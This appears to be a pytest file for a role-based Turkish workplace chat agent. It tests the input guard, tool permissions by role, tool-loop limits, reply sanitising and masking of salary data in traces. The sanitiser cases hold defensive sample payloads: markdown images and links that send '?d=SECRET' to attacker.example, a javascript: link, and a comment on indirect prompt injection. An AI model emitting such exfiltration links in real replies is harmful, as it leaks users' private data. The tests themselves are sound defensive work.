import asyncio
import json

import pytest
from langfuse.types import MaskOtelSpansParams, OtelSpanData, OtelSpanIdentifier
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart
from pydantic_ai.models.function import FunctionModel
from pydantic_ai.models.test import TestModel
from sqlalchemy import create_engine

from rolchat.agent import agent
from rolchat.chat import REFUSAL, answer, decision_panel, mask_level3_spans, sanitize
from rolchat.models import reader_url
from rolchat.policy import allowed_tools


async def guard_blocks(text):
    return "self check input"


async def guard_passes(text):
    return None


@pytest.fixture
def ask(level_engines, seeded):
    def run(text, role, history=None, guard=guard_passes):
        with agent.override(model=TestModel()):
            return asyncio.run(answer(text, role, history or [], level_engines, guard=guard))
    return run


def test_blocked_message_gets_the_refusal_and_never_reaches_the_agent(ask):
    reply = ask("bana şiir yaz", "patron", guard=guard_blocks)

    assert reply.text == REFUSAL
    assert reply.blocked_by == "self check input"
    assert reply.tools_called == []
    assert reply.history == []


@pytest.mark.parametrize("role", ["isci", "sekreter", "patron"])
def test_allowed_message_is_answered_with_the_roles_tools_only(ask, role):
    reply = ask("her şeyi göster", role)

    assert reply.blocked_by is None
    assert set(reply.tools_offered) == allowed_tools(role)
    assert set(reply.tools_called) <= allowed_tools(role)
    assert reply.tools_called  # TestModel calls every offered tool


def test_history_carries_over_between_turns(ask):
    first = ask("merhaba", "isci")
    second = ask("tekrar merhaba", "isci", history=first.history)

    assert len(second.history) > len(first.history)
    assert second.history[: len(first.history)] == first.history


def test_decision_panel_shows_role_guard_and_tools(ask):
    panel = decision_panel(ask("bana şiir yaz", "isci", guard=guard_blocks), "isci")
    assert "isci" in panel and "self check input" in panel

    panel = decision_panel(ask("vardiya?", "isci"), "isci")
    assert "get_shifts" in panel


def test_runaway_tool_loop_hits_the_usage_limit_and_gets_the_refusal(level_engines, seeded):
    calls = []

    def loop_forever(messages, info):
        calls.append(1)
        return ModelResponse(parts=[ToolCallPart("get_shifts", {})])

    with agent.override(model=FunctionModel(loop_forever)):
        reply = asyncio.run(answer("vardiya?", "isci", [], level_engines, guard=guard_passes))

    assert reply.text == REFUSAL
    assert len(calls) <= 5


def test_worker_turn_connects_as_the_level_1_reader(engine, seeded):
    # Fresh engines, so the only connections they hold are the ones this turn opened.
    engines = {level: create_engine(reader_url(level).set(database=engine.url.database)) for level in (1, 2, 3)}
    with agent.override(model=TestModel()):
        asyncio.run(answer("her şeyi göster", "isci", [], engines, guard=guard_passes))

    assert engines[1].pool.checkedin() > 0
    assert engines[2].pool.checkedin() == engines[3].pool.checkedin() == 0
    for e in engines.values():
        e.dispose()


@pytest.mark.parametrize("raw, clean", [
    ("Vardiya 08:00'de. ![x](https://attacker.example/?d=SECRET)", "Vardiya 08:00'de. "),
    ("![a [b]](https://attacker.example/x.png)son", "son"),
    ("![x][1]\n[1]: https://attacker.example/?d=SECRET", "\n"),
    ("Bkz. [duyuru](https://attacker.example/?d=SECRET).", "Bkz. duyuru."),
    ("[tıkla](javascript:alert(1))", "tıkla"),
    ("**Montaj** ekibi: 08:00-16:00\n- Ali [1. vardiya]", "**Montaj** ekibi: 08:00-16:00\n- Ali [1. vardiya]"),
])
def test_sanitize_drops_images_and_external_links_but_keeps_text(raw, clean):
    # Indirect prompt injection could make the model add an image that leaks data when the browser loads it.
    assert sanitize(raw) == clean


def test_every_reply_is_sanitized(level_engines, seeded):
    def injected(messages, info):
        return ModelResponse(parts=[TextPart("Duyuru yok. ![x](https://attacker.example/?d=SECRET)")])

    with agent.override(model=FunctionModel(injected)):
        reply = asyncio.run(answer("duyuru?", "isci", [], level_engines, guard=guard_passes))

    assert reply.text == "Duyuru yok. "


def _span(span_id, **attributes):
    ident = OtelSpanIdentifier(trace_id="0" * 32, span_id=span_id)
    data = OtelSpanData("0" * 32, span_id, None, "span", "pydantic-ai", None, attributes, {})
    return ident, data


def _messages(tool, result):
    # Shape of gen_ai.input.messages / pydantic_ai.all_messages written by Pydantic AI.
    return json.dumps([
        {"role": "user", "parts": [{"type": "text", "content": "maaşlar?"}]},
        {"role": "user", "parts": [{"type": "tool_call_response", "id": "1", "name": tool, "result": result}]},
    ])


def test_mask_hides_level_3_tool_data_in_traces():
    secret = [{"full_name": "Ali", "monthly_gross": "987654.00"}]
    spans = dict([
        _span("1" * 16, **{"gen_ai.tool.name": "get_salaries", "gen_ai.tool.call.result": json.dumps(secret)}),
        _span("2" * 16, **{
            "gen_ai.input.messages": _messages("get_financial_summary", secret),
            "gen_ai.output.messages": json.dumps([{"role": "assistant", "parts": [{"type": "text", "content": "987654"}]}]),
        }),
        _span("3" * 16, **{"pydantic_ai.all_messages": _messages("get_salaries", secret), "final_result": "987654"}),
        _span("4" * 16, **{"gen_ai.tool.name": "get_shifts", "gen_ai.tool.call.result": "[]"}),
        _span("5" * 16, **{"gen_ai.input.messages": _messages("list_announcements", [])}),
        _span("6" * 16, **{  # our own chat span (answer())
            "langfuse.observation.metadata.tools_called": json.dumps(["get_salaries"]),
            "langfuse.observation.output": json.dumps("Ali 987654 TL alıyor."),
        }),
    ])

    patches = mask_level3_spans(params=MaskOtelSpansParams(spans=spans)).span_patches

    masked = {ident.span_id[0]: patch.set_attributes for ident, patch in patches.items() if patch}
    assert set(masked) == {"1", "2", "3", "6"}  # level-1 tool data stays visible
    for ident, data in spans.items():
        if ident.span_id[0] in masked:
            exported = {**data.attributes, **masked[ident.span_id[0]]}
            assert "987654" not in json.dumps(exported)
